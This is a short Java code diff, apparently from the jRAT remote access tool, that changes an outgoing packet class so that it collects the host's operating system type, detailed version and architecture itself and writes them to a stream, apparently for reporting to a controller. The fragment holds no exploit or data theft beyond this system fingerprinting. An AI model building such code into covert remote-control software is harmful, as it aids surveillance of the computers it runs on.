@@ -4,24 +4,19 @@ import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
 
+import com.redpois0n.oslib.AbstractOperatingSystem;
+import com.redpois0n.oslib.Arch;
+import com.redpois0n.oslib.OperatingSystem;
 
 public class Packet16InitOperatingSystem extends AbstractOutgoingPacket {
 
-	private String sOs;
-	private String lOs;
-	private String arch;
-
-	public Packet16InitOperatingSystem(String sOs, String lOs, String arch) {
-		this.sOs = sOs;
-		this.lOs = lOs;
-		this.arch = arch;
-	}
-
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(sOs);
-		sw.writeLine(lOs);
-		sw.writeLine(arch);
+		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
+		
+		sw.writeLine(os.getType().getName());
+		sw.writeLine(os.getDetailedString());
+		sw.writeLine(Arch.getStringFromArch());
 	}
 
 	@Override
